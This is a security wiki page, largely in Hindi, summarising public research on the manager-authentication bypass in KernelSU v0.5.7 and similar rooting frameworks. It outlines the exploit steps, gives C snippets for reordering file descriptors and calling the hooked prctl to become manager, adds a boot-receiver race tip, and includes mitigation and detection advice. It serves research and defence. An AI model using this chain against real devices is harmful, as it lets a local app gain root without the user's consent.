# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

रूटिंग फ्रेमवर्क जैसे KernelSU, APatch, SKRoot और Magisk अक्सर Linux/Android कर्नेल को पैच करते हैं और एक हुक की गई syscall के माध्यम से एक अप्रिविलेज्ड यूजर्स्पेस "मैनेजर" ऐप को विशेषाधिकार प्राप्त कार्यक्षमता प्रदान करते हैं। यदि मैनेजर-प्रमाणीकरण चरण में कोई दोष है, तो कोई भी स्थानीय ऐप इस चैनल तक पहुंच सकता है और पहले से रूट किए गए उपकरणों पर विशेषाधिकार बढ़ा सकता है।

यह पृष्ठ सार्वजनिक अनुसंधान में उजागर तकनीकों और खतरों का सारांश प्रस्तुत करता है (विशेष रूप से Zimperium के KernelSU v0.5.7 के विश्लेषण) ताकि लाल और नीली टीमों को हमले की सतहों, शोषण प्राइमिटिव्स और मजबूत शमन को समझने में मदद मिल सके।

---
## आर्किटेक्चर पैटर्न: syscall-hooked मैनेजर चैनल

- कर्नेल मॉड्यूल/पैच एक syscall (आम तौर पर prctl) को हुक करता है ताकि यूजर्स्पेस से "कमांड" प्राप्त कर सके।
- प्रोटोकॉल आमतौर पर है: magic_value, command_id, arg_ptr/len ...
- एक यूजर्स्पेस मैनेजर ऐप पहले प्रमाणीकरण करता है (जैसे, CMD_BECOME_MANAGER)। एक बार जब कर्नेल कॉलर को एक विश्वसनीय मैनेजर के रूप में चिह्नित करता है, तो विशेषाधिकार प्राप्त कमांड स्वीकार किए जाते हैं:
- कॉलर को रूट दें (जैसे, CMD_GRANT_ROOT)
- su के लिए अनुमति सूचियों/निषेध सूचियों का प्रबंधन करें
- SELinux नीति को समायोजित करें (जैसे, CMD_SET_SEPOLICY)
- संस्करण/कॉन्फ़िगरेशन पूछें
- चूंकि कोई भी ऐप syscalls को सक्रिय कर सकता है, मैनेजर प्रमाणीकरण की सहीता महत्वपूर्ण है।

उदाहरण (KernelSU डिज़ाइन):
- हुक की गई syscall: prctl
- KernelSU हैंडलर की ओर मोड़ने के लिए जादुई मान: 0xDEADBEEF
- कमांड में शामिल हैं: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, आदि।

---
## KernelSU v0.5.7 प्रमाणीकरण प्रवाह (जैसा कि लागू किया गया)

जब यूजर्स्पेस prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...) को कॉल करता है, KernelSU सत्यापित करता है:

1) पथ उपसर्ग जांच
- प्रदान किया गया पथ कॉलर UID के लिए अपेक्षित उपसर्ग से शुरू होना चाहिए, जैसे /data/data/<pkg> या /data/user/<id>/<pkg>।
- संदर्भ: core_hook.c (v0.5.7) पथ उपसर्ग लॉजिक।

2) स्वामित्व जांच
- पथ को कॉलर UID द्वारा स्वामित्व होना चाहिए।
- संदर्भ: core_hook.c (v0.5.7) स्वामित्व लॉजिक।

3) FD तालिका स्कैन के माध्यम से APK हस्ताक्षर जांच
- कॉलिंग प्रक्रिया के खुले फ़ाइल डिस्क्रिप्टर्स (FDs) को दोहराएं।
- पहले फ़ाइल का चयन करें जिसका पथ /data/app/*/base.apk से मेल खाता है।
- APK v2 हस्ताक्षर को पार्स करें और आधिकारिक मैनेजर प्रमाणपत्र के खिलाफ सत्यापित करें।
- संदर्भ: manager.c (FDs को दोहराना), apk_sign.c (APK v2 सत्यापन)।

यदि सभी जांच पास हो जाती हैं, तो कर्नेल अस्थायी रूप से मैनेजर का UID कैश करता है और उस UID से विशेषाधिकार प्राप्त कमांड स्वीकार करता है जब तक कि रीसेट न हो जाए।

---
## भेद्यता वर्ग: FD पुनरावृत्ति से "पहले मेल खाने वाले APK" पर भरोसा करना

यदि हस्ताक्षर जांच "पहले मेल खाने वाले /data/app/*/base.apk" पर बंधी होती है जो प्रक्रिया FD तालिका में पाई जाती है, तो यह वास्तव में कॉलर के अपने पैकेज की सत्यापन नहीं कर रही है। एक हमलावर एक वैध रूप से हस्ताक्षरित APK (वास्तविक मैनेजर का) को पहले से स्थिति में रख सकता है ताकि यह FD सूची में अपने स्वयं के base.apk से पहले दिखाई दे।

यह अप्रत्यक्षता द्वारा विश्वास एक अप्रिविलेज्ड ऐप को मैनेजर का अनुकरण करने की अनुमति देती है बिना मैनेजर की हस्ताक्षर कुंजी के स्वामित्व के।

शोषित की गई प्रमुख विशेषताएँ:
- FD स्कैन कॉलर के पैकेज पहचान से बंधा नहीं है; यह केवल पथ स्ट्रिंग्स का पैटर्न मिलाता है।
- open() सबसे कम उपलब्ध FD लौटाता है। निचले क्रमांक वाले FDs को पहले बंद करके, एक हमलावर क्रम को नियंत्रित कर सकता है।
- फ़िल्टर केवल यह जांचता है कि पथ /data/app/*/base.apk से मेल खाता है - यह नहीं कि यह कॉलर के स्थापित पैकेज से मेल खाता है।

---
## हमले की पूर्व शर्तें

- उपकरण पहले से ही एक कमजोर रूटिंग फ्रेमवर्क (जैसे, KernelSU v0.5.7) के साथ रूट किया गया है।
- हमलावर स्थानीय रूप से मनमाना अप्रिविलेज्ड कोड चला सकता है (Android ऐप प्रक्रिया)।
- वास्तविक मैनेजर ने अभी तक प्रमाणीकरण नहीं किया है (जैसे, रिबूट के तुरंत बाद)। कुछ फ्रेमवर्क सफलता के बाद मैनेजर UID को कैश करते हैं; आपको दौड़ जीतनी होगी।

---
## शोषण रूपरेखा (KernelSU v0.5.7)

उच्च-स्तरीय कदम:
1) उपसर्ग और स्वामित्व जांचों को संतुष्ट करने के लिए अपने ऐप डेटा निर्देशिका के लिए एक मान्य पथ बनाएं।
2) सुनिश्चित करें कि एक वास्तविक KernelSU मैनेजर base.apk आपके अपने base.apk से कम क्रमांक वाले FD पर खोला गया है।
3) prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) को कॉल करें ताकि जांच पास हो सके।
4) CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY जैसे विशेषाधिकार प्राप्त कमांड जारी करें ताकि ऊंचाई बनी रहे।

कदम 2 (FD क्रम) पर व्यावहारिक नोट्स:
- /proc/self/fd सिमलिंक्स को चलाकर अपने /data/app/*/base.apk के लिए अपने प्रक्रिया के FD की पहचान करें।
- एक निम्न FD (जैसे, stdin, fd 0) बंद करें और पहले वैध मैनेजर APK खोलें ताकि यह fd 0 (या आपके अपने base.apk fd से कम कोई भी अनुक्रमांक) पर कब्जा कर ले।
- वैध मैनेजर APK को अपने ऐप के साथ बंडल करें ताकि इसका पथ कर्नेल के सरल फ़िल्टर को संतुष्ट करे। उदाहरण के लिए, इसे /data/app/*/base.apk से मेल खाने वाले उपपथ के तहत रखें।

उदाहरण कोड स्निपेट (Android/Linux, केवल उदाहरण के लिए):

खुले FDs को सूचीबद्ध करें ताकि base.apk प्रविष्टियों को खोजा जा सके:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
कम संख्या वाले FD को वैध प्रबंधक APK की ओर इंगित करने के लिए मजबूर करें:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
प्रबंधक प्रमाणीकरण prctl हुक के माध्यम से:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
After success, privileged commands (examples):
- CMD_GRANT_ROOT: वर्तमान प्रक्रिया को रूट पर प्रमोट करें
- CMD_ALLOW_SU: अपने पैकेज/UID को स्थायी su के लिए अनुमति सूची में जोड़ें
- CMD_SET_SEPOLICY: SELinux नीति को फ्रेमवर्क द्वारा समर्थित के रूप में समायोजित करें

Race/persistence tip:
- AndroidManifest में एक BOOT_COMPLETED रिसीवर पंजीकृत करें (RECEIVE_BOOT_COMPLETED) ताकि रिबूट के बाद जल्दी शुरू हो सके और वास्तविक प्रबंधक से पहले प्रमाणीकरण का प्रयास कर सके।

---
## Detection and mitigation guidance

For framework developers:
- प्रमाणीकरण को कॉलर के पैकेज/UID से बंधित करें, मनमाने FDs से नहीं:
- कॉलर के UID से पैकेज को हल करें और स्थापित पैकेज के हस्ताक्षर (PackageManager के माध्यम से) के खिलाफ सत्यापित करें, न कि FDs को स्कैन करके।
- यदि केवल कर्नेल है, तो स्थिर कॉलर पहचान (कार्य क्रेड्स) का उपयोग करें और init/userspace सहायक द्वारा प्रबंधित सत्य के स्थिर स्रोत पर मान्य करें, न कि प्रक्रिया FDs पर।
- पहचान के रूप में पथ-पूर्वाग्रह जांच से बचें; ये कॉलर द्वारा तृतीयक रूप से संतोषजनक होते हैं।
- चैनल पर nonce-आधारित चुनौती-प्रतिक्रिया का उपयोग करें और बूट या प्रमुख घटनाओं पर किसी भी कैश किए गए प्रबंधक पहचान को साफ करें।
- जब संभव हो, तो सामान्य syscalls को ओवरलोड करने के बजाय बाइंडर-आधारित प्रमाणित IPC पर विचार करें।

For defenders/blue team:
- रूटिंग फ्रेमवर्क और प्रबंधक प्रक्रियाओं की उपस्थिति का पता लगाएं; यदि आपके पास कर्नेल टेलीमेट्री है तो संदिग्ध जादुई स्थिरांक (जैसे, 0xDEADBEEF) के साथ prctl कॉल की निगरानी करें।
- प्रबंधित बेड़ों पर, अनधिकृत पैकेजों से बूट रिसीवर्स पर ब्लॉक या अलर्ट करें जो बूट के बाद तेजी से विशेष प्रबंधक आदेशों का प्रयास करते हैं।
- सुनिश्चित करें कि उपकरण पैच किए गए फ्रेमवर्क संस्करणों के लिए अपडेट किए गए हैं; अपडेट पर कैश किए गए प्रबंधक IDs को अमान्य करें।

Limitations of the attack:
- केवल उन उपकरणों को प्रभावित करता है जो पहले से ही एक कमजोर फ्रेमवर्क के साथ रूट किए गए हैं।
- आमतौर पर एक रिबूट/रेस विंडो की आवश्यकता होती है इससे पहले कि वैध प्रबंधक प्रमाणीकरण करे (कुछ फ्रेमवर्क प्रबंधक UID को रीसेट होने तक कैश करते हैं)।

---
## Related notes across frameworks

- पासवर्ड-आधारित प्रमाणीकरण (जैसे, ऐतिहासिक APatch/SKRoot निर्माण) कमजोर हो सकता है यदि पासवर्ड अनुमानित/ब्रूटफोर्स किए जा सकें या मान्यताएँ बग्गी हों।
- पैकेज/हस्ताक्षर-आधारित प्रमाणीकरण (जैसे, KernelSU) सिद्धांत में मजबूत है लेकिन इसे वास्तविक कॉलर से बंधित होना चाहिए, न कि FD स्कैन जैसे अप्रत्यक्ष कलाकृतियों से।
- Magisk: CVE-2024-48336 (MagiskEoP) ने दिखाया कि यहां तक कि परिपक्व पारिस्थितिकी तंत्र भी पहचान धोखाधड़ी के प्रति संवेदनशील हो सकते हैं जो प्रबंधक संदर्भ के भीतर कोड निष्पादन की ओर ले जाती है।

---
## References

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
